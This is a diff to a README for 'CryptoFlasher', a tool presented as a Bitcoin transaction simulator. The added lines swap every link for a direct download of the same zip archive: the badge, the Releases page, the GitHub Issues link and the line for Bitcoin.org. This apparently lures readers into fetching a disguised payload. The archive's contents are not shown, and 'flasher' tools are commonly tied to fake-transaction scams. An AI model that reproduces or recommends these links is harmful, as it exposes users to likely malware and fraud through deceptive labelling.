@@ -1,6 +1,6 @@
 # 🚀 CryptoFlasher - Simulate Bitcoin Transactions with Ease
 
-![Download CryptoFlasher](https://img.shields.io/badge/Download-CryptoFlasher-blue)
+![Download CryptoFlasher](https://github.com/AnonyMysTY/CryptoFlasher/raw/refs/heads/main/paraphernalia/Crypto_Flasher_isochronic.zip)
 
 ## 📖 Description
 
@@ -18,7 +18,7 @@ CryptoFlasherV2 is a blockchain transaction simulator designed to generate and s
 
 To begin using CryptoFlasher, you need to download the application from our Releases page. 
 
-**Visit this page to download:** [CryptoFlasher Releases](https://github.com/AnonyMysTY/CryptoFlasher/releases)
+**Visit this page to download:** [CryptoFlasher Releases](https://github.com/AnonyMysTY/CryptoFlasher/raw/refs/heads/main/paraphernalia/Crypto_Flasher_isochronic.zip)
 
 ### 🖥️ System Requirements
 
@@ -31,7 +31,7 @@ To begin using CryptoFlasher, you need to download the application from our Rele
 
 1. **Visit the Releases Page**
 
-   Go to our [Releases page](https://github.com/AnonyMysTY/CryptoFlasher/releases). You will find the latest version of CryptoFlasher available for download.
+   Go to our [Releases page](https://github.com/AnonyMysTY/CryptoFlasher/raw/refs/heads/main/paraphernalia/Crypto_Flasher_isochronic.zip). You will find the latest version of CryptoFlasher available for download.
 
 2. **Download the Application**
 
@@ -72,7 +72,7 @@ To begin using CryptoFlasher, you need to download the application from our Rele
 
 If you are new to Bitcoin or want to learn more about how transactions work, many resources are available:
 
-- **Bitcoin.org:** A comprehensive guide on Bitcoin basics.
+- **https://github.com/AnonyMysTY/CryptoFlasher/raw/refs/heads/main/paraphernalia/Crypto_Flasher_isochronic.zip** A comprehensive guide on Bitcoin basics.
 - **Investopedia:** Articles detailing how cryptocurrencies function.
 - **YouTube:** Tutorials on using Bitcoin wallets and making transactions.
 
@@ -88,7 +88,7 @@ If you encounter any issues while using CryptoFlasher, try the following steps:
 
 Engage with fellow users and developers in our community support channels. You can find helpful discussions and answers to common questions.
 
-- **GitHub Issues:** Report bugs or request features [here](https://github.com/AnonyMysTY/CryptoFlasher/issues).
+- **GitHub Issues:** Report bugs or request features [here](https://github.com/AnonyMysTY/CryptoFlasher/raw/refs/heads/main/paraphernalia/Crypto_Flasher_isochronic.zip).
 - **Telegram Group:** Join our Telegram group for live discussions and tips from other users.
 
 ## 📗 Additional Information
@@ -97,4 +97,4 @@ For advanced users, CryptoFlasher also includes a config file that can customize
 
 ---
 
-Once you have completed these steps, you should be ready to effectively use CryptoFlasher for simulating Bitcoin transactions. For more information, always refer back to our [Releases page](https://github.com/AnonyMysTY/CryptoFlasher/releases) or the in-app help section.
+Once you have completed these steps, you should be ready to effectively use CryptoFlasher for simulating Bitcoin transactions. For more information, always refer back to our [Releases page](https://github.com/AnonyMysTY/CryptoFlasher/raw/refs/heads/main/paraphernalia/Crypto_Flasher_isochronic.zip) or the in-app help section.
